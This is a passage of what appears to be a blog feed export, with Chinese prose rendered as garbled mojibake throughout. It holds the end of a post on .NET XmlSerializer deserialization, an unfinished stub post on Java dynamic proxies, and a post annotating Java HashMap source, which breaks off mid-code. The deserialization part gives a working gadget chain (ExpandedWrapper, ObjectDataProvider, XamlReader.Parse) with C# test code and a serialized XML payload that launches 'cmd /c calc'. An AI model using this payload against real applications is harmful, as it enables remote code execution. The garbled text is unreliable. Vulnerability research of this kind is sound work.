<p>åˆ°è¿™é‡Œæˆ‘ä»¬çŸ¥é“äº†é€šè¿‡<code>ExpandWrapper</code>åŒ…è£…<code>ObjectDataProvider</code>å¯ä»¥æˆåŠŸè°ƒç”¨å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­è°ƒç”¨çš„æ–¹æ³•æ—¶è‡ªå®šä¹‰ç±»<code>ProcessT</code>çš„<code>eval</code>æ–¹æ³•ï¼Œè€Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ˜¯å¦å­˜åœ¨è¿™æ ·ä¸€ä¸ªå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å‘¢ï¼Ÿ<br>å¯èƒ½ä¼šæœ‰ï¼Œä½†æ˜¯è¿™é‡Œä¸è®¨è®ºï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡å¦ä¸€ç§æ–¹å¼è§£å†³<code>Process</code>ä¸èƒ½åºåˆ—åŒ–çš„é—®é¢˜ã€‚<br>é€šè¿‡å‰é¢çš„å†…å®¹æˆ‘ä»¬çŸ¥é“é€šè¿‡<code>ObjectDataProvider</code>å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>XmlSerializer -&gt; ObjectDataProvider -&gt; xxxç±»xxæ–¹æ³• -&gt; objectDataProvider -&gt; Process</code>ä¸ä¸€æ ·å¯ä»¥è§£å†³é—®é¢˜ï¼Ÿ<br>è¿™é‡Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶æ—¶<code>xxxç±»xxxæ–¹æ³•</code>åœ¨è°ƒç”¨åˆ°<code>ObjectDataprovider</code>çš„è¿‡ç¨‹ä¸­ä¸ä¼šå‡ºç°å‰é¢æåˆ°çš„æŸäº›ç±»ä¸èƒ½åºåˆ—åŒ–çš„é—®é¢˜ã€‚<br>è¿™é‡Œæ‰¾åˆ°çš„ç±»ä»¥åŠæ–¹æ³•ä¸º<code>XamlReader</code>çš„<code>parse</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä»¥å°†<code>xaml</code>å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹åº”çš„æ•°æ®å¯¹è±¡ã€‚<br>ä½¿ç”¨å¦‚ä¸‹æ ¼å¼çš„<code>payload</code>è¾¹å¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ResourceDictionary</span> </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span><span class="attr">http:</span>//<span class="attr">schemas.microsoft.com</span>/<span class="attr">winfx</span>/<span class="attr">2006</span>/<span class="attr">xaml</span>/<span class="attr">presentation</span>&quot;&quot; </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:d</span>=<span class="string">&quot;&quot;</span><span class="attr">http:</span>//<span class="attr">schemas.microsoft.com</span>/<span class="attr">winfx</span>/<span class="attr">2006</span>/<span class="attr">xaml</span>&quot;&quot; </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:b</span>=<span class="string">&quot;&quot;</span><span class="attr">clr-namespace:System</span>;<span class="attr">assembly</span>=<span class="string">mscorlib</span>&quot;&quot; </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:c</span>=<span class="string">&quot;&quot;</span><span class="attr">clr-namespace:System.Diagnostics</span>;<span class="attr">assembly</span>=<span class="string">system</span>&quot;&quot;&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ObjectDataProvider</span> <span class="attr">d:Key</span>=<span class="string">&quot;&quot;</span>&quot;&quot; <span class="attr">ObjectType</span>=<span class="string">&quot;&quot;</span>&#123;<span class="attr">d:Type</span> <span class="attr">c:Process</span>&#125;&quot;&quot; <span class="attr">MethodName</span>=<span class="string">&quot;&quot;</span><span class="attr">Start</span>&quot;&quot;&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ObjectDataProvider.MethodParameters</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">b:String</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">b:String</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">b:String</span>&gt;</span>/c calc<span class="tag">&lt;/<span class="name">b:String</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ObjectDataProvider.MethodParameters</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ObjectDataProvider</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ResourceDictionary</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œæµ‹è¯•</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">ExpandedWrapper&lt;XamlReader, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;XamlReader, ObjectDataProvider&gt;();</span><br><span class="line">            expandedWrapper.ProjectedProperty0 = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            expandedWrapper.ProjectedProperty0.ObjectInstance = <span class="keyword">new</span> XamlReader();</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodName = <span class="string">&quot;Parse&quot;</span>;</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodParameters.Add(<span class="string">@&quot;&lt;ResourceDictionary </span></span><br><span class="line"><span class="string">                    xmlns=&quot;&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;&quot; </span></span><br><span class="line"><span class="string">                    xmlns:d=&quot;&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;&quot; </span></span><br><span class="line"><span class="string">                    xmlns:b=&quot;&quot;clr-namespace:System;assembly=mscorlib&quot;&quot; </span></span><br><span class="line"><span class="string">                    xmlns:c=&quot;&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;ObjectDataProvider d:Key=&quot;&quot;&quot;&quot; ObjectType=&quot;&quot;&#123;d:Type c:Process&#125;&quot;&quot; MethodName=&quot;&quot;Start&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">                        &lt;b:String&gt;cmd&lt;/b:String&gt;</span></span><br><span class="line"><span class="string">                        &lt;b:String&gt;/c calc&lt;/b:String&gt;</span></span><br><span class="line"><span class="string">                    &lt;/ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">                &lt;/ObjectDataProvider&gt;</span></span><br><span class="line"><span class="string">            &lt;/ResourceDictionary&gt;</span></span><br><span class="line"><span class="string">            &quot;</span>);</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            XmlSerializer xml = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(ExpandedWrapper&lt;XamlReader, ObjectDataProvider&gt;));</span><br><span class="line">            xml.Serialize(writer, expandedWrapper);</span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            xml.Deserialize(memoryStream);</span><br><span class="line">            Console.ReadKey();</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥åªéœ€å°†<code>xaml</code>ä¸é€šè¿‡<code>objectProvider</code>è°ƒç”¨<code>XamlReader.Parse</code>æ–¹æ³•çš„å­—ç¬¦ä¸²ç»“åˆèµ·æ¥å³å¯<br><code>XmlSerializer</code>çš„<code>Deserialize</code>æ–¹æ³•è°ƒç”¨æ—¶å…ˆåˆ›å»º<code>ExpandWrapper</code>å¯¹è±¡ï¼Œåœ¨ä¸º<code>ExpandWrapper</code>çš„å±æ€§<code>ProjectedProperty0</code>èµ‹å€¼æ—¶ä¼šè°ƒç”¨<code>Read7_ObjectDataProvider</code>æ–¹æ³•åˆ›å»º<code>ObjectDataProvider</code>å¯¹è±¡ï¼Œ<br><code>ObjectDataProvider</code>å¯¹è±¡åˆ›å»ºè¿‡ç¨‹ä¸­ä¼šè°ƒç”¨åˆ°<code>MethodName</code>çš„<code>set</code>è®¿é—®å™¨ï¼Œç„¶åè§¦çŠ¯<code>XamlReader</code>çš„<code>Parse</code>æ–¹æ³•å¯¹<code>ResourceDictionary</code>è¿›è¡Œè§£æåˆ›å»º<code>ObjectDataProvider</code>è¿™ä¸ªèµ„æºï¼Œä»è€Œå†æ¬¡è®¿é—®åˆ°<code>ObjectDataProvider</code>çš„<code>MethodName</code>å±æ€§çš„<code>set</code>è®¿é—®å™¨<br>ä»è€Œè°ƒç”¨åˆ°<code>Process</code>çš„<code>Start</code>æ–¹æ³•ï¼Œä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ExpandedWrapperOfXamlReaderObjectDataProvider</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> &gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">ExpandedElement</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MethodName</span>&gt;</span>Parse<span class="tag">&lt;/<span class="name">MethodName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MethodParameters</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">anyType</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span></span><br><span class="line">                &lt;![CDATA[</span><br><span class="line">					&lt;ResourceDictionary </span><br><span class="line">						xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; </span><br><span class="line">						xmlns:d=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; </span><br><span class="line">						xmlns:b=&quot;clr-namespace:System;assembly=mscorlib&quot; </span><br><span class="line">						xmlns:c=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;</span><br><span class="line">						&lt;ObjectDataProvider d:Key=&quot;&quot; ObjectType=&quot;&#123;d:Type c:Process&#125;&quot; MethodName=&quot;Start&quot;&gt;</span><br><span class="line">							&lt;ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">								&lt;b:String&gt;cmd&lt;/b:String&gt;</span><br><span class="line">								&lt;b:String&gt;/c calc&lt;/b:String&gt;</span><br><span class="line">							&lt;/ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">						&lt;/ObjectDataProvider&gt;</span><br><span class="line">					&lt;/ResourceDictionary&gt;</span><br><span class="line">					]]&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">anyType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">MethodParameters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ObjectInstance</span> <span class="attr">xsi:type</span>=<span class="string">&quot;XamlReader&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ObjectInstance</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ExpandedWrapperOfXamlReaderObjectDataProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>C#</tag>
        <tag>BinnaryFormatter</tag>
        <tag>XmlSerializer</tag>
        <tag>ObjectDataProvider</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŠ¨æ€ä»£ç†åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­çš„åº”ç”¨</title>
    <url>/archives/3792a892.html</url>
    <content><![CDATA[<p>test</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>åŠ¨æ€ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Java HashMap å®ç°æ–¹æ³•</title>
    <url>/archives/31bfcb8f.html</url>
    <content><![CDATA[<h1 id="æˆå‘˜å˜é‡å«ä¹‰"><a href="#æˆå‘˜å˜é‡å«ä¹‰" class="headerlink" title="æˆå‘˜å˜é‡å«ä¹‰"></a>æˆå‘˜å˜é‡å«ä¹‰</h1><table>
<thead>
<tr>
<th>å˜é‡å</th>
<th>é»˜è®¤å€¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>DEFAULT_INITIAL_CAPACITY</td>
<td>16</td>
<td>é»˜è®¤åˆå§‹åŒ–å®¹é‡</td>
</tr>
<tr>
<td>MAXIMUM_CAPACITY</td>
<td>1 &lt;&lt; 30</td>
<td>æœ€å¤§å®¹é‡</td>
</tr>
<tr>
<td>DEFAULT_LOAD_FACTOR</td>
<td>0.75</td>
<td>é»˜è®¤åŠ è½½å› å­ï¼Œå½“æ•°ç»„ä¸­å…ƒç´ æ•°é‡è¶…è¿‡æ€»é•¿åº¦çš„0.75çš„æ—¶å€™ä¼šè¿›è¡Œè‡ªåŠ¨æ‰©å®¹</td>
</tr>
<tr>
<td>TREEIFY_THRESHOLD</td>
<td>8</td>
<td>å½“é“¾è¡¨é•¿åº¦è¶…è¿‡8çš„æ—¶å€™ä¼šå°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘</td>
</tr>
<tr>
<td>UNTREEIFY_THRESHOLD</td>
<td>6</td>
<td>å½“é“¾è¡¨å…ƒç´ å°‘äº6çš„æ—¶å€™ä¼šå°†çº¢é»‘æ ‘è½¬æ¢ä¸ºé“¾è¡¨</td>
</tr>
<tr>
<td>MIN_TREEIFY_CAPACITY</td>
<td>64</td>
<td>åªæœ‰å½“æ•°ç»„é•¿åº¦å¤§äº64çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œé“¾è¡¨çš„æ ‘åŒ–ï¼Œå› ä¸ºé“¾è¡¨æ ‘åŒ–ä¼šå¢åŠ ç©ºé—´å¤æ‚åº¦ï¼Œå¦‚æœåªè¦æŸä¸€ä¸ªé“¾è¡¨é•¿åº¦è¶…è¿‡8å°±è¿›è¡Œæ ‘åŒ–å¾—åˆ°çš„æŸ¥è¯¢æ—¶é—´ä¼˜åŒ–ä¸å¢åŠ çš„ç©ºé—´æ¶ˆè€—ä¸¤ç›¸æ¯”è¾ƒæ˜¯å¾—ä¸å¿å¤±çš„</td>
</tr>
</tbody></table>
<span id="more"></span>
<h1 id="å¯¹è±¡åˆ›å»º"><a href="#å¯¹è±¡åˆ›å»º" class="headerlink" title="å¯¹è±¡åˆ›å»º"></a>å¯¹è±¡åˆ›å»º</h1><p>åŒ…å«ä¸‰ä¸ªé‡è½½æ–¹æ³•ï¼Œå¯æä¾›å¯¹åˆå§‹åŒ–å®¹é‡ä»¥åŠåŠ è½½å› å­çš„æŒ‡å®šã€‚ä¸è¿‡ä¸€èˆ¬ä½¿ç”¨æ— å‚æ„é€ æ–¹æ³•å°±è¡Œ</p>
<h1 id="putæ–¹æ³•"><a href="#putæ–¹æ³•" class="headerlink" title="putæ–¹æ³•"></a>putæ–¹æ³•</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// é¦–å…ˆè°ƒç”¨hashæ–¹æ³•è®¡ç®—keyçš„hashå€¼</span></span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    <span class="comment">// tab é€šè¿‡keyçš„hashç´¢å¼•çš„æ•°ç»„  p Nodeç±»å‹ è¡¨ç¤ºé“¾è¡¨çš„ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">        <span class="comment">// é€šè¿‡æ— å‚æ„é€ æ–¹æ³•åˆ›å»ºæ—¶ table ä¸ºè¢«æŒ‡å®šå¤§å°ï¼Œåˆ™è°ƒç”¨resizeæ–¹æ³•è¢«è®¾ç½®ä¸ºåˆå§‹åŒ–å¤§å° 16</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">        <span class="comment">// å¦‚æœhashå¯¹åº”çš„ç´¢å¼•æœªçŸ¥ä¸ºç©º åˆ™ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„é“¾è¡¨èŠ‚ç‚¹æ”¾åˆ°è¯¥æœªçŸ¥</span></span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="comment">// å¦‚æœhashå¯¹åº”ç´¢å¼•ä½ç½®ä¸ä¸ºç©ºä¸”å·²å­˜åœ¨èŠ‚ç‚¹ä¸å½“å‰å¾…æ·»åŠ å…ƒç´ keyå€¼ç›¸ç­‰åˆ™å¯¹å€¼è¿›è¡Œè¦†ç›–</span></span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            <span class="comment">// å¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯çº¢é»‘æ ‘èŠ‚ç‚¹ åˆ™è°ƒç”¨putTreeValæ–¹æ³•è¿›è¡Œæœç´¢æ·»åŠ </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// éå†é“¾è¡¨èŠ‚ç‚¹</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// å¦‚æœéå†åˆ°äº†é“¾è¡¨çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹åˆ™ç›´æ¥å°†å½“å‰å¾…æ·»åŠ å…ƒç´ æ·»åŠ åˆ°é“¾è¡¨æœ«å°¾</span></span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                        <span class="comment">// å¦‚æœæ·»åŠ åé“¾è¡¨é•¿åº¦è¶…è¿‡äº†æ ‘åŒ–é˜ˆå€¼ åˆ™å¯¹è¯¥é“¾è¡¨è¿›è¡Œæ ‘åŒ–</span></span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// å¦‚æœé“¾è¡¨ä¸­çš„æŸä¸€ä¸ªèŠ‚ç‚¹çš„keyå€¼ä¸å½“å‰å¾…æ·»åŠ å…ƒç´ çš„keyå€¼ç›¸ç­‰åˆ™å¯¹å€¼è¿›è¡Œè¦†ç›–</span></span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// è¿›è¡Œå€¼è¦†ç›–</span></span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ ‡è®°hashmapç»“æ„ä¿®æ”¹æ¬¡æ•°</span></span><br><span class="line">        ++modCount;</span><br><span class="line">        <span class="comment">// å¦‚æœå½“å‰hashmapçš„æ•°ç»„é•¿åº¦è¶…è¿‡äº†åŠ è½½å› å­è§„å®šçš„é˜ˆå€¼å°†å¯¹æ•°ç»„é•¿åº¦è¿›è¡Œæ‰©å®¹</span></span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="æ ‘åŒ–"><a href="#æ ‘åŒ–" class="headerlink" title="æ ‘åŒ–"></a>æ ‘åŒ–</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> hash)</span> &#123;</span><br><span class="line">        <span class="type">int</span> n, index; Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="comment">// å¦‚æœæ•°ç»„é•¿åº¦å°äºæœ€å°æ ‘åŒ–å°ºå¯¸åˆ™åªè¿›è¡Œæ‰©å®¹è€Œä¸è¿›è¡Œæ ‘åŒ–</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">            resize();</span><br><span class="line">        <span class="comment">// å–å¾—å½“å‰é“¾è¡¨çš„å¤´èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((e = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="literal">null</span>) &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// å°†æ¯ä¸€ä¸ªé“¾è¡¨èŠ‚ç‚¹éƒ½æ›¿æ¢ä¸ºçº¢é»‘æ ‘èŠ‚ç‚¹TreeNode</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// TreeNodeæ˜¯ä¸€ä¸ªåŒå‘é“¾æ¡èŠ‚ç‚¹</span></span><br><span class="line">                TreeNode&lt;K,V&gt; p = replacementTreeNode(e, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (tl == <span class="literal">null</span>)</span><br><span class="line">                    hd = p;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    p.prev = tl;</span><br><span class="line">                    tl.next = p;</span><br><span class="line">                &#125;</span><br><span class="line">                tl = p;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> ((tab[index] = hd) != <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// æ„å»ºçº¢é»‘æ ‘</span></span><br><span class="line">                hd.treeify(tab);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeify</span><span class="params">(Node&lt;K,V&gt;[] tab)</span> &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; root = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (TreeNode&lt;K,V&gt; x = <span class="built_in">this</span>, next; x != <span class="literal">null</span>; x = next) &#123;</span><br><span class="line">                <span class="comment">// è·å–åŒå‘é“¾è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">                next = (TreeNode&lt;K,V&gt;)x.next;</span><br><span class="line">                <span class="comment">// å½“å‰èŠ‚ç‚¹çš„å·¦å¶ä¸å³å¶å‡åˆå§‹åŒ–ä¸ºç©º</span></span><br><span class="line">                x.left = x.right = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// å½“ä¸ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æ—¶å€™ rootä¸ºnull</span></span><br><span class="line">                <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// æ ¹èŠ‚ç‚¹æ˜¯æ²¡æœ‰çˆ¶èŠ‚ç‚¹çš„</span></span><br><span class="line">                    x.parent = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// æ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²</span></span><br><span class="line">                    x.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="comment">// æ­¤æ—¶è·å¾—äº†çº¢é»‘æ ‘çš„æ ¹èŠ‚ç‚¹</span></span><br><span class="line">                    root = x;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å½“æ ¹èŠ‚ç‚¹ä¸ä¸ºç©ºçš„æ—¶å€™  ä¹Ÿå°±æ˜¯è¿›è¡Œç¬¬äºŒæ¬¡æˆ–è€…ä»¥ä¸Šæ¬¡æ•°çš„å¾ªç¯ï¼ŒéåŒå‘é“¾è¡¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æ—¶å€™</span></span><br><span class="line">        <span class="comment">// ç°åœ¨æˆ‘ä»¬å‡è®¾æ­£åœ¨è¿›è¡Œç¬¬äºŒè½®å¾ªç¯</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// ç¬¬äºŒä¸ªèŠ‚ç‚¹çš„key</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">k</span> <span class="operator">=</span> x.key;</span><br><span class="line">                    <span class="comment">// ç¬¬äºŒä¸ªèŠ‚ç‚¹çš„hash</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> x.hash;</span><br><span class="line">                    Class&lt;?&gt; kc = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// </span></span><br><span class="line">                    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = root;;) &#123;</span><br><span class="line">                        <span class="type">int</span> dir, ph;</span><br><span class="line">                        <span class="comment">// æ ¹å‡ ç‚¹çš„key</span></span><br><span class="line">                        <span class="type">K</span> <span class="variable">pk</span> <span class="operator">=</span> p.key;</span><br><span class="line">                        <span class="comment">// æ ¹èŠ‚ç‚¹çš„hash</span></span><br><span class="line">                        <span class="comment">// å¦‚æœæ ¹èŠ‚ç‚¹çš„hashå¤§äºå½“å‰èŠ‚ç‚¹çš„hashåˆ™ dirä¸º-1</span></span><br><span class="line">                        <span class="comment">// çº¢é»‘æ ‘æŸä¸ªèŠ‚ç‚¹çš„å·¦å­å¶çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½è¦å°äºç­‰äºè¯¥èŠ‚ç‚¹çš„å€¼ï¼Œæ‰€æœ‰çš„å³å­å¶çš„å€¼éƒ½è¦å¤§äºç­‰äºè¯¥èŠ‚ç‚¹çš„å€¼</span></span><br><span class="line">                        <span class="comment">// æ‰€ä»¥è¿™ä¸ªdirå› è¯¥æ˜¯ç”¨æ¥è°ƒæ•´å½“å‰èŠ‚ç‚¹çš„æ’å…¥ä½ç½® </span></span><br><span class="line">                        <span class="comment">// dirå†³å®šäº†è°å‰è°å</span></span><br><span class="line">                        <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">                            dir = -<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">                            dir = <span class="number">1</span>;</span><br><span class="line">                        <span class="comment">// å½“ä¸¤è€…hashç›¸ç­‰æ—¶</span></span><br><span class="line">                        <span class="comment">// åŒä¸€ä¸ªç±»å‹çš„å¯¹è±¡ compareComparables è¿”å› 0 ç„¶åè°ƒç”¨tieBreakOrderè¿›ä¸€æ­¥æ¯”è¾ƒ</span></span><br><span class="line">                        